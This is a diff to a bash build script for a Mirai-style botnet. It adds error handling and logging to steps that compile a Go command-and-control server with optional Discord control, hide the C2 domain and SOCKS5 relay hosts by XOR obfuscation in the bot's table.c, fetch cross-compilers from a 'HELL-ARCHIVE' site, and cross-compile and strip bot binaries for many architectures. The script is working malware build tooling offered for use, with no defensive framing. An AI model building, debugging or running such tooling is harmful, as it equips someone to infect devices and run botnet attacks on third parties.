@@ -138,7 +138,7 @@ export DEBIAN_FRONTEND=noninteractive
 
 log INFO "Installing required packages"
 apt-get update -yq >/dev/null 2>&1
-apt-get install -yq wget unzip gcc snapd screen bzip2 >/dev/null 2>&1
+apt-get install -yq wget unzip gcc snapd screen bzip2 python3 >/dev/null 2>&1
 
 if ! command -v go &> /dev/null; then
     log INFO "Installing Go via snap"
@@ -159,14 +159,35 @@ cd "$WORK_DIR"
 
 log INFO "Building CNC"
 cd cnc
-log INFO "Downloading Go dependencies (this may take a moment)..."
-go mod tidy >/dev/null 2>&1
-if [ "$USE_DISCORD" -eq 1 ]; then
-    go get github.com/bwmarrin/discordgo@v0.28.1 >/dev/null 2>&1
-fi
-go build -o cnc main.go >/dev/null 2>&1 || { log ERROR "CNC build failed"; exit 1; }
 
-log INFO "CNC binary built successfully"
+log INFO "Downloading Go dependencies (this may take a moment)..."
+go mod tidy > /tmp/cnc_mod_tidy.log 2>&1
+if [ $? -ne 0 ]; then
+    log ERROR "go mod tidy failed!"
+    cat /tmp/cnc_mod_tidy.log | while IFS= read -r line; do log ERROR "  $line"; done
+    exit 1
+fi
+
+if [ "$USE_DISCORD" -eq 1 ]; then
+    log INFO "Fetching Discord Go library..."
+    go get github.com/bwmarrin/discordgo@v0.28.1 > /tmp/cnc_discord_get.log 2>&1
+    if [ $? -ne 0 ]; then
+        log ERROR "Failed to fetch Discord dependency!"
+        cat /tmp/cnc_discord_get.log | while IFS= read -r line; do log ERROR "  $line"; done
+        exit 1
+    fi
+fi
+
+log INFO "Compiling CNC binary..."
+go build -o cnc main.go > /tmp/cnc_build.log 2>&1
+if [ $? -ne 0 ]; then
+    log ERROR "CNC build failed!"
+    log ERROR "  --- Build errors ---"
+    cat /tmp/cnc_build.log | while IFS= read -r line; do log ERROR "  $line"; done
+    exit 1
+fi
+
+log INFO "CNC binary built successfully ($(du -h cnc | cut -f1))"
 log INFO "You can start the CNC manually with: screen -dmS cnc ./cnc"
 
 # Configure Discord bot if enabled
@@ -197,8 +218,14 @@ fi
 
 # Generate XOR-obfuscated table entry for the CNC domain
 log INFO "Generating encrypted table entry for domain: $CNC_DOMAIN"
-py -3 "$SCRIPT_DIR/generate_table.py" "$CNC_DOMAIN" > /tmp/table_entry.txt
+python3 "$SCRIPT_DIR/generate_table.py" "$CNC_DOMAIN" > /tmp/table_entry.txt 2>&1
 TABLE_ENTRY=$(grep "add_entry" /tmp/table_entry.txt | head -1)
+if [ -z "$TABLE_ENTRY" ]; then
+    log ERROR "Failed to generate table entry for domain! Check generate_table.py or python3 installation."
+    log ERROR "Contents of /tmp/table_entry.txt:"
+    cat /tmp/table_entry.txt
+    exit 1
+fi
 sed -i "s|^.*TABLE_CNC_DOMAIN.*|$TABLE_ENTRY|" bot/table.c
 log INFO "CNC domain encrypted in table.c"
 
@@ -221,8 +248,13 @@ if [ "$USE_RELAY" -eq 1 ] && [ ${#RELAY_HOSTS[@]} -gt 0 ]; then
             break
         fi
         
-        py -3 "$SCRIPT_DIR/generate_table.py" "$RELAY" > /tmp/relay_entry.txt
+        python3 "$SCRIPT_DIR/generate_table.py" "$RELAY" > /tmp/relay_entry.txt 2>&1
         RELAY_ENTRY=$(grep "add_entry" /tmp/relay_entry.txt | head -1)
+        if [ -z "$RELAY_ENTRY" ]; then
+            log ERROR "Failed to generate table entry for relay $RELAY! Contents of /tmp/relay_entry.txt:"
+            cat /tmp/relay_entry.txt
+            exit 1
+        fi
         sed -i "s|^.*TABLE_RELAY_${TABLE_INDEX}.*|$RELAY_ENTRY|" bot/table.c
         log INFO "  Relay $TABLE_INDEX: $RELAY encrypted"
     done
@@ -248,13 +280,20 @@ download_compiler() {
     local arch="$1"
     if [ ! -d "/etc/xcompile/$arch" ]; then
         log INFO "Downloading $arch compiler"
-        wget -q "https://www.mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-$arch.tar.bz2" -O "$arch.tar.bz2"
+        wget -q "https://www.mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-$arch.tar.bz2" -O "$arch.tar.bz2" 2>/tmp/compiler_dl_error.txt
         if [ $? -eq 0 ]; then
             tar -xjf "$arch.tar.bz2" >/dev/null 2>&1
+            if [ $? -ne 0 ]; then
+                log ERROR "Failed to extract $arch compiler archive (may be corrupted)"
+                rm -f "$arch.tar.bz2"
+                return 1
+            fi
             mv "cross-compiler-$arch" "$arch"
             rm -f "$arch.tar.bz2"
         else
             log WARN "Failed to download $arch compiler"
+            log WARN "  Download error: $(cat /tmp/compiler_dl_error.txt)"
+            log WARN "  You can manually place cross-compilers in /etc/xcompile/$arch/"
         fi
     fi
 }
@@ -283,14 +322,23 @@ compile_bot() {
     local output="$2"
     local flags="$3"
     local compiler="/etc/xcompile/$arch/bin/$arch-gcc"
+    local compiler_check="${arch}-gcc"
     
     if [ ! -f "$compiler" ]; then
-        if command -v "$arch-gcc" &> /dev/null; then
-            compiler="$arch-gcc"
+        if command -v "$compiler_check" &> /dev/null; then
+            compiler="$compiler_check"
         else
-            log ERROR "Compiler for $arch not found"
+            log WARN "Compiler for $arch not found, skipping $output"
+            log WARN "  Tried: $compiler and $compiler_check"
+            log WARN "  Make sure cross-compiler-$arch is installed in /etc/xcompile/"
             return 1
         fi
+    fi
+    
+    # Check if compiler is actually executable
+    if [ ! -x "$(command -v "$compiler" 2>/dev/null || echo "$compiler")" ]; then
+        log WARN "Compiler for $arch is not executable, skipping $output"
+        return 1
     fi
     
     # Add ENS define if enabled
@@ -301,23 +349,34 @@ compile_bot() {
     # Add RELAY define if enabled
     if [ "$USE_RELAY" -eq 1 ]; then
         flags="$flags -DRELAY_MODE"
-        log INFO "Compiling $output with relay mode (SOCKS5 via $RELAY_HOST:$RELAY_PORT)..."
+        log INFO "Compiling $output with relay mode (SOCKS5 via ${RELAY_HOSTS[0]:-relay}:$RELAY_PORT)..."
     elif [ "$USE_ENS" -eq 1 ]; then
         log INFO "Compiling $output with ENS support..."
     else
         log INFO "Compiling for $output..."
     fi
     
-    "$compiler" -std=c99 $flags bot/*.c -O3 -s -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o "release/$output" -DMIRAI_BOT_ARCH=\""$output"\" 2>/dev/null
+    compile_log="/tmp/compile_${output}.log"
+    "$compiler" -std=c99 $flags bot/*.c -O3 -s -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o "release/$output" -DMIRAI_BOT_ARCH=\""$output"\" > "$compile_log" 2>&1
     
     if [ $? -eq 0 ]; then
         local strip="${compiler%-gcc}-strip"
         if [ -f "$strip" ] || command -v "$strip" &> /dev/null; then
-            "$strip" "release/$output" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr 2>/dev/null
+            "$strip" "release/$output" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr > /dev/null 2>&1
         fi
-        log INFO "Successfully compiled $output"
+        log INFO "Successfully compiled $output ($(du -h "release/$output" | cut -f1))"
+        rm -f "$compile_log"
     else
-        log ERROR "Failed to compile $output"
+        log ERROR "Failed to compile $output!"
+        log ERROR "  Architecture: $arch"
+        log ERROR "  Compiler: $compiler"
+        log ERROR "  Flags: -std=c99 $flags"
+        log ERROR "  Error log saved to: $compile_log"
+        log ERROR "  --- First 20 lines of error output ---"
+        head -20 "$compile_log" 2>/dev/null | while IFS= read -r line; do
+            log ERROR "  $line"
+        done
+        log ERROR "  --- Full log available at: $compile_log ---"
     fi
 }
 
